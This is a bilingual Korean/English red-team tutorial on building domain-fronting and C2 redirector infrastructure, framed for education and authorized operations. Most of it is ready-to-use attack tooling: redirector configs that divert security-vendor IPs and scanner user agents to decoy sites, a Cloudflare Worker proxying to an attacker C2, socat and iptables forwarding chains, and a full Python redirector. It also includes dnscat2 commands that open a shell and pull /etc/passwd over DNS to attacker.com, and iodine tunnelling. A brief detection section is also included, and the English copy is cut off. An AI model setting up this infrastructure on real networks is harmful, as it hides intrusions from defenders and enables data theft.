> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# 도메인 프론팅 및 리다이렉터 구축

> **목적**: 교육, 연구, CTF, 공인된 레드팀 작전 환경에서의 학습용 자료

## 0. 초보자를 위한 개념 이해

### 도메인 프론팅과 리다이렉터란?

도메인 프론팅(Domain Fronting)은 CDN(콘텐츠 전송 네트워크)의 구조적 특성을 이용해 실제 C2 서버 위치를 숨기는 기법이다. 리다이렉터(Redirector)는 에이전트와 실제 팀 서버 사이의 중계 서버다. 두 기법 모두 방어자가 C2 인프라를 차단하기 어렵게 만드는 OPSEC 기술이다.

**왜 배우는가:**
```
왜 리다이렉터가 필요한가:

  단순 C2 구조 (취약):
    피해자 PC → [팀서버 IP: 1.2.3.4]
    방어자가 1.2.3.4 차단 → 작전 종료

  리다이렉터 사용 (강인):
    피해자 PC → [리다이렉터 A] → [팀서버] (숨겨짐)
                 피해자 PC → [리다이렉터 B] ↗
    방어자가 A 차단 → B로 계속 통신
    팀서버 IP는 절대 노출되지 않음

  도메인 프론팅:
    피해자 PC → [CDN: google.com] → [실제 C2]
               ↑ SNI: google.com (정상 트래픽처럼 보임)
               ↑ Host: c2.evil.com (실제 목적지)

  블루팀 탐지 방법:
    - SNI와 Host 헤더 불일치 탐지
    - CDN 제공사에 신고 (도메인 프론팅 차단 정책)
    - JA3/JA3S TLS 핑거프린트 분석
```

### 핵심 개념 정리

```
리다이렉터 유형:

1. 단순 포트 포워딩
   socat TCP-LISTEN:443 TCP:team-server:443
   → 가장 단순, 팀 서버 앞에 한 홉 추가

2. nginx 역방향 프록시
   → URL 기반 필터링: 에이전트 요청만 통과
   → 일반 웹 트래픽처럼 보이게 위장

3. CDN 리다이렉터 (Cloudflare Workers)
   → 실제 CDN 인프라 사용 → 차단 어려움
   → Cloudflare의 도메인 프론팅 정책 변경으로 일부 제한

도메인 프론팅 원리:
  HTTPS TLS 핸드셰이크:
    SNI(Server Name Indication): 라우팅에 사용 → 정상 도메인
    Host 헤더: 실제 요청 목적지 → C2 도메인

  CDN이 SNI만 보고 라우팅 →
  Host 헤더는 CDN 내부에서만 처리 →
  외부에서는 정상 CDN 트래픽으로 보임
```

### 필요한 도구 및 환경
- **nginx**: 역방향 프록시 리다이렉터 구성
- **socat**: 빠른 포트 포워딩 테스트
- **Cloudflare Workers**: CDN 기반 리다이렉터
- **Caddy**: 자동 HTTPS 인증서 관리 웹 서버
- **Terraform**: 인프라 자동화 배포

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""
리다이렉터 설정 파일 자동 생성기
nginx 및 socat 설정을 자동으로 생성한다.
※ 허가된 레드팀 환경에서만 사용
"""
import json


def generate_nginx_redirector_config(
    listen_port: int,
    team_server_ip: str,
    team_server_port: int,
    allowed_user_agents: list[str],
    decoy_site: str = "https://example.com",
) -> str:
    """
    nginx 리다이렉터 설정을 생성한다.
    에이전트 User-Agent만 팀 서버로 전달하고
    나머지는 정상 사이트로 리다이렉트한다.
    """
    ua_conditions = "\n        ".join(
        f'if ($http_user_agent = "{ua}") {{ set $valid_agent 1; }}'
        for ua in allowed_user_agents
    )

    config = f"""
# nginx 리다이렉터 설정
# 에이전트: 팀 서버로 프록시, 기타: 정상 사이트로 리다이렉트

server {{
    listen {listen_port} ssl;
    server_name redirector.example.com;

    ssl_certificate /etc/letsencrypt/live/redirector.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector.example.com/privkey.pem;

    # 기본: 정상 사이트로 리다이렉트 (허위 트래픽 위장)
    set $valid_agent 0;

    # 허용된 에이전트 User-Agent 체크
    {ua_conditions}

    location / {{
        # 에이전트가 아니면 정상 사이트로
        if ($valid_agent = 0) {{
            return 302 {decoy_site};
        }}

        # 에이전트는 팀 서버로 프록시
        proxy_pass https://{team_server_ip}:{team_server_port};
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
        proxy_ssl_verify off;
    }}
}}
"""
    return config


def generate_socat_command(
    listen_port: int,
    target_ip: str,
    target_port: int,
) -> str:
    """빠른 포트 포워딩을 위한 socat 명령어를 생성한다."""
    return (
        f"socat TCP4-LISTEN:{listen_port},fork,reuseaddr "
        f"TCP4:{target_ip}:{target_port}"
    )


if __name__ == "__main__":
    # 예시 설정 생성
    config = generate_nginx_redirector_config(
        listen_port=443,
        team_server_ip="10.0.0.1",
        team_server_port=8443,
        allowed_user_agents=[
            "Mozilla/5.0 (Compatible; MSIE 10.0; Windows NT 6.1)",
        ],
        decoy_site="https://microsoft.com",
    )
    print("[nginx 리다이렉터 설정]")
    print(config)

    socat_cmd = generate_socat_command(443, "10.0.0.1", 8443)
    print("[socat 포트 포워딩 명령어]")
    print(f"  {socat_cmd}")
    print("\n[보안 고려사항]")
    print("  - 팀 서버 IP는 절대 공개망에 노출 금지")
    print("  - 작전 종료 후 모든 리다이렉터 즉시 폐기")
    print("  - 로그는 암호화 저장 후 작전 종료 시 삭제")
```

---

## 1. 도메인 프론팅 (Domain Fronting)

### 1.1 원리

도메인 프론팅은 CDN(Content Delivery Network)의 특성을 이용해 실제 C2 트래픽을 정상 트래픽으로 위장하는 기법이다.

```
일반 HTTPS 연결:
  클라이언트 → SNI: malicious.com → 실제 서버: malicious.com
  (네트워크 검사 장비가 SNI를 보고 차단 가능)

도메인 프론팅:
  클라이언트 → SNI: allowed-cdn.com → CDN → Host: real-c2.com → C2 서버
              (방화벽은 allowed-cdn.com 만 봄)
```

### 1.2 작동 방식 상세

```
TLS 레이어 (네트워크에서 보임):
  SNI = "legitimate.cloudfront.net"   ← 방화벽/IDS가 보는 것

HTTP 레이어 (TLS 내부, 암호화됨):
  Host: "c2.attacker-backend.com"     ← CDN이 라우팅하는 것

CDN 동작:
  1. TLS 종료 → SNI 확인 → CDN 내부 처리
  2. HTTP Host 헤더 확인 → 실제 오리진 서버로 포워딩
  3. 오리진 서버 = 공격자 C2

결과:
  - 방화벽 입장: legitimate.cloudfront.net 으로 HTTPS 연결 (허용)
  - 실제 통신: c2.attacker-backend.com 으로 요청 전달
```

### 1.3 현재 상태 및 제한

```
현황 (2024 기준):
  - AWS CloudFront: 도메인 프론팅 공식 차단 (2018년부터)
  - Cloudflare: Workers를 통한 간접 구현 가능
  - Azure CDN: 일부 시나리오에서 가능
  - Google Cloud CDN: 제한적

대안 기법:
  1. Domain Borrowing: CDN CNAME 체인 활용
  2. Fronted C2: CDN Worker/Function을 프록시로 활용
  3. Cloud Function C2: Lambda/Cloud Functions 경유
```

### 1.4 Cloudflare Workers를 이용한 C2 프록시 개념

```javascript
// Cloudflare Worker 예시 (개념)
// cloudflare.com 도메인을 통해 실제 C2로 포워딩

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  // 실제 C2 서버 주소
  const C2_BACKEND = 'https://real-c2.attacker.com'
  
  // 요청 복제 및 포워딩
  const newRequest = new Request(C2_BACKEND + new URL(request.url).pathname, {
    method: request.method,
    headers: request.headers,
    body: request.body,
  })
  
  return fetch(newRequest)
}
```

---

## 2. HTTP Redirector 구축

### 2.1 Apache mod_rewrite 리다이렉터

```bash
# Apache 설치 및 모듈 활성화
apt-get install apache2 -y
a2enmod rewrite proxy proxy_http ssl

# 가상 호스트 설정: /etc/apache2/sites-available/redirector.conf
```

```apache
<VirtualHost *:80>
    ServerName redirector.example.com
    
    # 모든 mod_rewrite 규칙 활성화
    RewriteEngine On
    
    # 블루팀/스캐너 차단 (알려진 보안업체 IP 대역)
    RewriteCond %{REMOTE_ADDR} ^66\.249\. [OR]    # Google
    RewriteCond %{REMOTE_ADDR} ^157\.55\. [OR]    # Microsoft/Bing
    RewriteCond %{REMOTE_ADDR} ^54\.239\.          # AWS Scanner
    RewriteRule .* https://www.microsoft.com/ [L,R=302]
    
    # User-Agent 필터링 (스캐너 차단)
    RewriteCond %{HTTP_USER_AGENT} (curl|wget|python|scanner|masscan|nmap) [NC]
    RewriteRule .* https://www.google.com/ [L,R=302]
    
    # Referer 검증 (옵션)
    # RewriteCond %{HTTP_REFERER} !^https://legitimate-site.com [NC]
    # RewriteRule .* https://www.microsoft.com/ [L,R=302]
    
    # 특정 URI 패턴만 C2로 포워딩 (Malleable C2 프로파일과 일치)
    RewriteCond %{REQUEST_URI} ^/updates/check [OR]
    RewriteCond %{REQUEST_URI} ^/api/v2/ [OR]
    RewriteCond %{REQUEST_URI} ^/static/js/
    RewriteRule ^(.*)$ http://10.0.0.5:8080$1 [P,L]
    
    # 나머지 모든 요청 → 합법적인 사이트
    RewriteRule .* https://www.example.com/ [L,R=302]
    
    # 프록시 설정
    ProxyPassReverse / http://10.0.0.5:8080/
</VirtualHost>
```

```bash
# 설정 적용
apache2ctl configtest
systemctl reload apache2

# 로그 확인
tail -f /var/log/apache2/access.log | grep -v "302"
```

### 2.2 Nginx 리다이렉터

```nginx
# /etc/nginx/sites-available/redirector.conf

# IP 블랙리스트 맵
geo $blocked_ip {
    default 0;
    66.249.0.0/16   1;   # Google
    157.55.0.0/16   1;   # Bing
    104.154.0.0/15  1;   # GCP Scanner
}

# User-Agent 블랙리스트 맵
map $http_user_agent $blocked_agent {
    default 0;
    ~*(curl|wget|python-requests|masscan|nmap|nuclei) 1;
}

server {
    listen 80;
    server_name redirector.example.com;
    
    # 차단된 IP/에이전트 처리
    if ($blocked_ip) {
        return 302 https://www.microsoft.com/;
    }
    if ($blocked_agent) {
        return 302 https://www.google.com/;
    }
    
    # C2 트래픽 라우팅 (특정 URI 패턴)
    location ~* ^/(updates|api/v2|static/js)/ {
        proxy_pass http://10.0.0.5:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        
        # 타임아웃 설정
        proxy_connect_timeout 10s;
        proxy_read_timeout 60s;
        
        # 에러 처리
        proxy_intercept_errors on;
        error_page 502 503 504 = @fallback;
    }
    
    # 폴백: 합법적 사이트
    location @fallback {
        return 302 https://www.example.com/;
    }
    
    # 기본: 합법적 사이트로 리다이렉트
    location / {
        return 302 https://www.example.com/;
    }
}
```

---

## 3. HTTPS 리다이렉터 + Let's Encrypt 인증서

### 3.1 Certbot으로 인증서 발급

```bash
# Certbot 설치
apt-get install certbot python3-certbot-nginx -y

# 인증서 발급 (HTTP-01 챌린지)
certbot --nginx -d redirector.example.com --non-interactive --agree-tos -m admin@example.com

# 와일드카드 인증서 (DNS-01 챌린지)
certbot certonly \
  --manual \
  --preferred-challenges dns \
  -d "*.example.com" \
  --agree-tos \
  -m admin@example.com

# 자동 갱신
systemctl enable certbot.timer
certbot renew --dry-run

# 인증서 경로
# /etc/letsencrypt/live/redirector.example.com/fullchain.pem
# /etc/letsencrypt/live/redirector.example.com/privkey.pem
```

### 3.2 HTTPS Nginx 설정

```nginx
server {
    listen 443 ssl http2;
    server_name redirector.example.com;
    
    ssl_certificate /etc/letsencrypt/live/redirector.example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/redirector.example.com/privkey.pem;
    
    # TLS 하드닝
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;
    ssl_prefer_server_ciphers off;
    ssl_session_cache shared:SSL:10m;
    ssl_session_timeout 1d;
    
    # HSTS
    add_header Strict-Transport-Security "max-age=31536000" always;
    
    # 리다이렉터 로직 (HTTP 설정과 동일)
    location ~* ^/(updates|api/v2)/ {
        proxy_pass https://10.0.0.5:443;
        proxy_ssl_verify off;  # 내부 C2 자체서명 인증서 허용
        proxy_set_header Host $host;
    }
    
    location / {
        return 302 https://www.example.com/;
    }
}

# HTTP → HTTPS 리다이렉트
server {
    listen 80;
    server_name redirector.example.com;
    return 301 https://$host$request_uri;
}
```

---

## 4. Socat/iptables 포트 포워딩 체인

### 4.1 Socat 포트 포워딩

```bash
# 설치
apt-get install socat -y

# TCP 포트 포워딩 (단순)
socat TCP-LISTEN:443,fork TCP:10.0.0.5:443

# 백그라운드 실행
nohup socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &

# systemd 서비스로 등록
cat > /etc/systemd/system/socat-redirector.service <<'EOF'
[Unit]
Description=Socat Port Redirector
After=network.target

[Service]
ExecStart=/usr/bin/socat TCP-LISTEN:443,fork,reuseaddr TCP:10.0.0.5:443
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

systemctl enable socat-redirector
systemctl start socat-redirector

# 멀티 포트 포워딩
socat TCP-LISTEN:80,fork TCP:10.0.0.5:80 &
socat TCP-LISTEN:443,fork TCP:10.0.0.5:443 &
socat TCP-LISTEN:8080,fork TCP:10.0.0.5:8080 &

# UDP 포워딩 (DNS C2)
socat UDP-LISTEN:53,fork UDP:10.0.0.5:53 &
```

### 4.2 iptables NAT 포워딩

```bash
# IP 포워딩 활성화
echo 1 > /proc/sys/net/ipv4/ip_forward
echo "net.ipv4.ip_forward = 1" >> /etc/sysctl.conf

# PREROUTING: 들어오는 트래픽 재작성
iptables -t nat -A PREROUTING \
  -p tcp \
  --dport 443 \
  -j DNAT \
  --to-destination 10.0.0.5:443

# POSTROUTING: 소스 IP 변경 (마스커레이딩)
iptables -t nat -A POSTROUTING \
  -p tcp \
  -d 10.0.0.5 \
  --dport 443 \
  -j MASQUERADE

# DNS UDP 포워딩
iptables -t nat -A PREROUTING \
  -p udp \
  --dport 53 \
  -j DNAT \
  --to-destination 10.0.0.5:53

iptables -t nat -A POSTROUTING \
  -p udp \
  -d 10.0.0.5 \
  --dport 53 \
  -j MASQUERADE

# 규칙 저장
iptables-save > /etc/iptables/rules.v4

# 규칙 확인
iptables -t nat -L -v -n

# 규칙 삭제 (정리)
iptables -t nat -F
```

### 4.3 다중 홉 포워딩 체인

```
구조:
  [에이전트] → [리다이렉터1 (공개 VPS)] → [리다이렉터2 (프라이빗)] → [C2 팀서버]
  
  리다이렉터1 (IP: 1.2.3.4):
    iptables -t nat -A PREROUTING -p tcp --dport 443 \
      -j DNAT --to-destination 5.6.7.8:443
  
  리다이렉터2 (IP: 5.6.7.8):
    socat TCP-LISTEN:443,fork TCP:192.168.1.10:443
  
  결과:
    에이전트는 1.2.3.4 만 알고
    C2 팀서버는 5.6.7.8 뒤에 숨겨짐
    1.2.3.4 차단 시 → 5.6.7.8만 변경하면 됨
```

---

## 5. DNS C2 채널

### 5.1 dnscat2 개념 및 사용법

```
dnscat2 작동 원리:
  클라이언트 → DNS 쿼리 (A/TXT/CNAME) → 권한 DNS 서버(공격자) → C2 처리
  
  인코딩 방식:
  - A 쿼리: <data_hex>.<session>.<domain>.attacker.com
  - TXT 쿼리: 더 많은 데이터 전송 가능
  - CNAME: 체인 쿼리
```

```bash
# dnscat2 서버 설치
git clone https://github.com/iagox86/dnscat2
cd dnscat2/server
gem install bundler
bundle install

# 서버 시작 (권한 DNS 모드)
ruby dnscat2.rb --dns domain=c2.attacker.com --secret=MySecret123

# 서버 시작 (포트 직접 바인딩)
ruby dnscat2.rb --dns port=5353 --secret=MySecret123

# 클라이언트 실행 (Windows)
dnscat2-v0.07-client-win32.exe --secret=MySecret123 c2.attacker.com

# 클라이언트 실행 (Linux)
./dnscat --secret=MySecret123 c2.attacker.com

# dnscat2 서버 명령
dnscat2> sessions              # 세션 목록
dnscat2> session -i 1          # 세션 선택
command (session1)> shell      # 쉘 열기
command (session1)> exec whoami
command (session1)> download /etc/passwd /tmp/passwd
command (session1)> tunnelserver 127.0.0.1:4444  # 터널링
```

### 5.2 DNS 레코드 설정 (권한 DNS)

```
# DNS 존 파일에 추가 (BIND 예시)
# /etc/bind/zones/attacker.com

$TTL 300
@   IN  SOA ns1.attacker.com. admin.attacker.com. (
            2024010101 ; Serial
            3600       ; Refresh
            900        ; Retry
            604800     ; Expire
            300 )      ; Minimum TTL

; NS 레코드 - c2 서브도메인의 네임서버를 자신으로 지정
c2  IN  NS  ns1.attacker.com.

; 네임서버 A 레코드
ns1 IN  A   1.2.3.4  ; 공격자 서버 IP
```

### 5.3 iodine DNS 터널링

```bash
# iodine: IP-over-DNS 터널
# 설치
apt-get install iodine

# 서버 측 (권한 DNS 보유)
iodined -f -c -P password 10.0.0.1 dns.attacker.com

# 클라이언트 측
iodine -f -P password dns.attacker.com
# → dns0 인터페이스 생성, 10.0.0.2 IP 할당

# 터널 통해 SSH
ssh -D 1080 10.0.0.1  # SOCKS 프록시
```

---

## 6. Python 트래픽 리다이렉터 스크립트

```python
#!/usr/bin/env python3
"""
교육용 Python HTTP/HTTPS 트래픽 리다이렉터
- IP/User-Agent 필터링
- URI 패턴 기반 라우팅
- C2 프록시 또는 디코이 응답
CTF/연구 환경 전용
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import logging
import re
import socket
import ssl
import sys
import threading
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Any


logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger(__name__)


@dataclass
class RedirectorConfig:
    """리다이렉터 설정"""
    c2_host: str
    c2_port: int
    decoy_url: str = "https://www.microsoft.com/"
    allowed_uris: list[str] = field(default_factory=list)
    blocked_agents: list[str] = field(default_factory=list)
    blocked_ips: list[str] = field(default_factory=list)
    use_ssl: bool = False
    cert_file: str = ""
    key_file: str = ""

    def __post_init__(self) -> None:
        if not self.allowed_uris:
            self.allowed_uris = [r"^/api/", r"^/updates/", r"^/static/js/"]
        if not self.blocked_agents:
            self.blocked_agents = [
                "curl", "wget", "python-requests", "masscan",
                "nmap", "nuclei", "shodan", "censys",
            ]


class TrafficFilter:
    """트래픽 필터링 로직"""

    def __init__(self, config: RedirectorConfig) -> None:
        self.config = config
        self._blocked_networks: list[ipaddress.IPv4Network] = []
        self._parse_blocked_ips()

    def _parse_blocked_ips(self) -> None:
        for ip_str in self.config.blocked_ips:
            try:
                net = ipaddress.IPv4Network(ip_str, strict=False)
                self._blocked_networks.append(net)
            except ValueError as e:
                logger.warning(f"잘못된 IP/CIDR: {ip_str} - {e}")

    def is_ip_blocked(self, ip: str) -> bool:
        try:
            addr = ipaddress.IPv4Address(ip)
            return any(addr in net for net in self._blocked_networks)
        except ValueError:
            return False

    def is_agent_blocked(self, user_agent: str) -> bool:
        ua_lower = user_agent.lower()
        return any(blocked in ua_lower for blocked in self.config.blocked_agents)

    def is_uri_allowed(self, uri: str) -> bool:
        return any(re.match(pattern, uri) for pattern in self.config.allowed_uris)


class RedirectorHandler(BaseHTTPRequestHandler):

    config: RedirectorConfig
    traffic_filter: TrafficFilter

    def log_message(self, fmt: str, *args: Any) -> None:
        pass  # 자체 로거 사용

    def _get_client_ip(self) -> str:
        forwarded = self.headers.get("X-Forwarded-For", "")
        if forwarded:
            return forwarded.split(",")[0].strip()
        return self.client_address[0]

    def _send_redirect(self, location: str, code: int = 302) -> None:
        self.send_response(code)
        self.send_header("Location", location)
        self.send_header("Content-Length", "0")
        self.end_headers()

    def _proxy_to_c2(self) -> None:
        """요청을 C2 서버로 포워딩"""
        c2_host = self.config.c2_host
        c2_port = self.config.c2_port
        protocol = "https" if self.config.use_ssl else "http"
        target_url = f"{protocol}://{c2_host}:{c2_port}{self.path}"

        headers: dict[str, str] = {}
        for key, val in self.headers.items():
            if key.lower() not in ("host", "transfer-encoding"):
                headers[key] = val
        headers["X-Forwarded-For"] = self._get_client_ip()

        body: bytes | None = None
        content_length = int(self.headers.get("Content-Length", 0))
        if content_length > 0:
            body = self.rfile.read(content_length)

        try:
            ctx = ssl.create_default_context() if self.config.use_ssl else None
            if ctx:
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(
                target_url,
                data=body,
                headers=headers,
                method=self.command,
            )

            with urllib.request.urlopen(req, timeout=30, context=ctx) as resp:
                self.send_response(resp.status)
                for key, val in resp.headers.items():
                    if key.lower() not in ("transfer-encoding", "connection"):
                        self.send_header(key, val)
                self.end_headers()
                self.wfile.write(resp.read())

            logger.info(f"[PROXY] {self._get_client_ip()} → {self.path}")

        except urllib.error.URLError as e:
            logger.warning(f"C2 연결 실패: {e}")
            self._send_redirect(self.config.decoy_url)
        except Exception as e:
            logger.error(f"프록시 오류: {e}")
            self._send_redirect(self.config.decoy_url)

    def _handle_request(self) -> None:
        client_ip = self._get_client_ip()
        user_agent = self.headers.get("User-Agent", "")

        # IP 필터링
        if self.traffic_filter.is_ip_blocked(client_ip):
            logger.info(f"[BLOCK-IP] {client_ip}")
            self._send_redirect(self.config.decoy_url)
            return

        # User-Agent 필터링
        if self.traffic_filter.is_agent_blocked(user_agent):
            logger.info(f"[BLOCK-UA] {client_ip} - {user_agent[:50]}")
            self._send_redirect(self.config.decoy_url)
            return

        # URI 패턴 검사
        if self.traffic_filter.is_uri_allowed(self.path):
            self._proxy_to_c2()
        else:
            logger.info(f"[DECOY] {client_ip} → {self.path}")
            self._send_redirect(self.config.decoy_url)

    def do_GET(self) -> None:
        self._handle_request()

    def do_POST(self) -> None:
        self._handle_request()

    def do_PUT(self) -> None:
        self._handle_request()

    def do_DELETE(self) -> None:
        self._handle_request()


def create_handler(config: RedirectorConfig) -> type[RedirectorHandler]:
    """설정을 주입한 핸들러 클래스 생성"""
    traffic_filter = TrafficFilter(config)

    class ConfiguredHandler(RedirectorHandler):
        pass

    ConfiguredHandler.config = config
    ConfiguredHandler.traffic_filter = traffic_filter
    return ConfiguredHandler


def load_config_file(path: str) -> dict[str, Any]:
    """JSON 설정 파일 로드"""
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError) as e:
        logger.error(f"설정 파일 로드 실패: {e}")
        sys.exit(1)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="교육용 HTTP 트래픽 리다이렉터 (CTF/연구 전용)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
사용 예시:
  # 기본 리다이렉터 (C2 → 10.0.0.5:8080)
  python3 redirector.py --c2-host 10.0.0.5 --c2-port 8080 --port 80

  # 설정 파일 사용
  python3 redirector.py --config redirector.json

  # HTTPS 모드
  python3 redirector.py --c2-host 10.0.0.5 --c2-port 443 \\
    --port 443 --ssl --cert server.pem --key server.key
        """,
    )
    parser.add_argument("--host", default="0.0.0.0", help="바인딩 호스트")
    parser.add_argument("--port", type=int, default=80, help="바인딩 포트")
    parser.add_argument("--c2-host", help="C2 서버 호스트")
    parser.add_argument("--c2-port", type=int, default=8080, help="C2 서버 포트")
    parser.add_argument("--decoy", default="https://www.microsoft.com/",
                        help="디코이 리다이렉트 URL")
    parser.add_argument("--config", help="JSON 설정 파일 경로")
    parser.add_argument("--allowed-uri", action="append", dest="allowed_uris",
                        help="허용할 URI 패턴 (정규식, 반복 가능)")
    parser.add_argument("--block-ip", action="append", dest="blocked_ips",
                        help="차단할 IP/CIDR (반복 가능)")
    parser.add_argument("--ssl", action="store_true", help="SSL 활성화")
    parser.add_argument("--cert", help="SSL 인증서 파일")
    parser.add_argument("--key", help="SSL 키 파일")
    return parser.parse_args()


def build_config(args: argparse.Namespace) -> RedirectorConfig:
    """CLI 인수 또는 설정 파일에서 설정 빌드"""
    if args.config:
        data = load_config_file(args.config)
        return RedirectorConfig(
            c2_host=data["c2_host"],
            c2_port=data.get("c2_port", 8080),
            decoy_url=data.get("decoy_url", "https://www.microsoft.com/"),
            allowed_uris=data.get("allowed_uris", []),
            blocked_agents=data.get("blocked_agents", []),
            blocked_ips=data.get("blocked_ips", []),
            use_ssl=data.get("use_ssl", False),
            cert_file=data.get("cert_file", ""),
            key_file=data.get("key_file", ""),
        )

    if not args.c2_host:
        logger.error("--c2-host 또는 --config 가 필요합니다")
        sys.exit(1)

    return RedirectorConfig(
        c2_host=args.c2_host,
        c2_port=args.c2_port,
        decoy_url=args.decoy,
        allowed_uris=args.allowed_uris or [],
        blocked_ips=args.blocked_ips or [],
        use_ssl=args.ssl,
        cert_file=args.cert or "",
        key_file=args.key or "",
    )


def main() -> None:
    args = parse_args()
    config = build_config(args)
    handler_class = create_handler(config)

    server = HTTPServer((args.host, args.port), handler_class)

    if config.use_ssl:
        if not (config.cert_file and config.key_file):
            logger.error("SSL 모드에는 --cert 와 --key 가 필요합니다")
            sys.exit(1)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(config.cert_file, config.key_file)
        server.socket = ctx.wrap_socket(server.socket, server_side=True)
        logger.info(f"HTTPS 리다이렉터 시작: https://{args.host}:{args.port}")
    else:
        logger.info(f"HTTP 리다이렉터 시작: http://{args.host}:{args.port}")

    logger.info(f"C2 백엔드: {config.c2_host}:{config.c2_port}")
    logger.info(f"허용 URI 패턴: {config.allowed_uris}")
    logger.info(f"디코이: {config.decoy_url}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("[*] 리다이렉터 종료")
        server.shutdown()


if __name__ == "__main__":
    main()
```

---

## 7. 리다이렉터 설정 파일 예시

```json
{
    "c2_host": "10.0.0.5",
    "c2_port": 8080,
    "decoy_url": "https://www.microsoft.com/",
    "allowed_uris": [
        "^/api/v2/",
        "^/updates/check",
        "^/static/js/bundle",
        "^/cdn-cgi/"
    ],
    "blocked_agents": [
        "curl", "wget", "python-requests",
        "masscan", "nmap", "nuclei",
        "shodan", "censys", "zgrab"
    ],
    "blocked_ips": [
        "66.249.0.0/16",
        "157.55.0.0/16",
        "54.239.0.0/16",
        "104.154.0.0/15"
    ],
    "use_ssl": false,
    "cert_file": "",
    "key_file": ""
}
```

---

## 8. 실전 리다이렉터 체인 구성

```
아키텍처:

인터넷
  │
  ▼
[Cloudflare CDN] ── 도메인 위장, DDoS 방어
  │
  ▼
[리다이렉터 VPS 1] ── Apache + mod_rewrite
  │    공개 IP: 1.2.3.4
  │    - 스캐너/블루팀 IP 차단
  │    - URI 패턴 필터링
  │
  ▼ (private 채널, VPN 또는 SSH 터널)
[리다이렉터 VPS 2] ── Nginx 역방향 프록시
  │    내부 IP: 10.10.0.2
  │    - 추가 필터링 레이어
  │    - 로깅 최소화
  │
  ▼
[C2 팀서버] ── 절대 직접 노출 안 됨
     내부 IP: 192.168.1.10
     - 화이트리스트: 리다이렉터 IP 만 허용
     - 방화벽으로 다른 모든 인바운드 차단

리다이렉터 교체 전략:
  - VPS 1 차단 시 → DNS를 새 VPS 1'로 변경
  - 팀서버는 그대로 유지 (IP 노출 방지)
  - 도메인이 차단되면 → 새 도메인 사용
```

---

## 참고 자료

- MITRE ATT&CK T1090: Proxy
- MITRE ATT&CK T1568: Dynamic Resolution
- "Red Team Development and Operations" - Joe Vest
- Apache mod_rewrite 공식 문서
- dnscat2 프로젝트: https://github.com/iagox86/dnscat2

---

<!-- detect-validate-49 -->
## 공격 탐지와 방어 검증

레드팀 인프라는 *어떻게 들키지 않고 운영하는가*를 다루지만, 방어자 관점에서는 **그 인프라가 네트워크 텔레메트리에 남는가**와 **탐지가 실제로 잡는가**를 검증해야 한다. 레드팀도 이 관점으로 자기 OPSEC 의 실효성을 가늠할 수 있다.

### 공격 → 완화 계층 → 통제(방어자) → 탐지 신호

| 기법 | 노리는 완화 | 1차 통제(예방) | 탐지 신호 |
|---|---|---|---|
| 도메인 프론팅(SNI≠Host) | TLS 검사 | SNI/Host 불일치 탐지, CDN 정책 | TLS SNI 와 HTTP Host 헤더 불일치 |
| HTTPS 리다이렉터 | 도메인 평판 | 신생 도메인 차단, 평판 필터 | 신규 등록 도메인, 짧은 TTL |
| 카테고리 분류 우회 | 웹 프록시 | 카테고리 강제, SSL 인터셉트 | 미분류 도메인으로의 비콘 |

### 방어 검증 (직접 확인)

```bash
# 1) SNI 와 Host 헤더 불일치(도메인 프론팅 신호) 탐지 재현
tshark -r capture.pcap -Y 'tls.handshake.extensions_server_name && http.host' \
  -T fields -e tls.handshake.extensions_server_name -e http.host
# 두 값이 다르면 프론팅 의심 → 인라인 프록시/NDR 이 이를 잡는지 확인
# 2) 리다이렉터 도메인의 등록일/TTL 확인(신생=위험)
whois example-redirector.tld | grep -i creation; dig +short example-redirector.tld
```

> 검증은 반드시 **소유한 시스템·통제된 환경**에서만 수행한다. 완화를 "설정했다"와 "런타임에 실제 막힌다"는 다르다 — PoC 를 재현해 완화가 차단하는지 확인해야 신뢰할 수 있다([[68_Purple_Team]]).

---


<a name="english"></a>

# Domain Fronting and Redirector Setup

> **Purpose**: Educational material for learning in CTF, research, and authorized red team operation environments

---

## 1. Domain Fronting

### 1.1 Principle

Domain fronting is a technique that uses the characteristics of CDNs (Content Delivery Networks) to disguise actual C2 traffic as legitimate traffic.

```
Normal HTTPS connection:
  Client → SNI: malicious.com → Actual server: malicious.com
  (Network inspection equipment can see SNI and block)

Domain fronting:
  Client → SNI: allowed-cdn.com → CDN → Host: real-c2.com → C2 server
              (Firewall only sees allowed-cdn.com)
```

### 1.2 Detailed Operation

```
TLS layer (visible on network):
  SNI = "legitimate.cloudfront.net"   ← What firewall/IDS sees

HTTP layer (inside TLS, encrypted):
  Host: "c2.attacker-backend.com"     ← What CDN routes

CDN behavior:
  1. TLS termination → Check SNI → Internal CDN processing
  2. Check HTTP Host header → Forward to actual origin server
  3. Origin server = attacker C2

Result:
  - From firewall's perspective: HTTPS connection to legitimate.cloudfront.net (allowed)
  - Actual communication: request forwarded to c2.attacker-backend.com
```

### 1.3 Current State and Limitations

```
Current status (as of 2024):
  - AWS CloudFront: officially blocks domain fronting (since 2018)
  - Cloudflare: indirect implementation possible via Workers
  - Azure CDN: possible in some scenarios
  - Google Cloud CDN: limited

Alternative techniques:
  1. Domain Borrowing: utilize CDN CNAME chains
